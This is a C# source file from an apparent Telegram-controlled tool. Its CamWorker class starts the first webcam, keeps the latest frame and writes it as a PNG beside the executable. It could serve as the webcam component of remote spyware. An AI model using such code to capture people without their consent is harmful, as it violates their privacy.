using AForge.Video;
using AForge.Video.DirectShow;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;

namespace TelegramCw
{
    public static class CamWorker
    {
        public static bool IsCameraExist;

        private static VideoCaptureDevice _device;

        private static Bitmap _bitmap;

        public static void Init()
        {
            var WebcamColl = new FilterInfoCollection(FilterCategory.VideoInputDevice);

            if(WebcamColl.Count > 0)
            {
                IsCameraExist = true;

                _device = new VideoCaptureDevice(WebcamColl[0].MonikerString);
                _device.Start();
                _device.NewFrame += new NewFrameEventHandler(Device_NewFrame);
            }
        }

        public static string GetCam()
        {
            var filePath = GetFilePath();

            var file = File.Create(filePath);

            _bitmap.Save(file, ImageFormat.Png);

            file.Close();
            _device.SignalToStop();

            return filePath;
        }

        private static void Device_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            _bitmap = (Bitmap)eventArgs.Frame.Clone();
        }

        private static string GetFilePath()
        {
            var path = Assembly.GetEntryAssembly()?.Location;

            var parts = path.Split('\\');

            path = string.Empty;

            for (int i = 0; i < parts.Length - 1; i++)
            {
                path += parts[i] + "\\";
            }

            path += Infrastructure.DataStore.TMP_IMAGE_FILE_NAME;

            return path;
        }
    }
}
